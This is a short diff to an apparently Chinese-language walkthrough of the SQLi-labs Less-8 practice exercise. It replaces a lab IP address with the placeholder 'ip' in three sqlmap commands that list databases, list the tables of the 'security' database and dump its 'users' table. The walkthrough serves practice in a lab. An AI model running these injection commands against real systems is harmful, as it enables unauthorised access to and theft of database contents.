@@ -193,11 +193,11 @@ print("🎉 时间盲注成功")
  ---
  用sqlmap跑：
  
- sqlmap -u "10.3.187.26:8848/Less-8/?id=1" --batch --dbs #爆库名
+ sqlmap -u "ip/Less-8/?id=1" --batch --dbs #爆库名
  
 ![](assets/Less-8/file-20260530212031781.png)
 
-sqlmap -u "10.3.187.26:8848/Less-8/?id=1" --batch -D security --tables #爆表
+sqlmap -u "ip/Less-8/?id=1" --batch -D security --tables #爆表
 ![](assets/Less-8/file-20260530212142316.png)
-sqlmap -u "10.3.187.26:8848/Less-8/?id=1" --batch -D security -T users --dump
+sqlmap -u "ip/Less-8/?id=1" --batch -D security -T users --dump #爆数据 
 ![](assets/Less-8/file-20260530212514478.png)
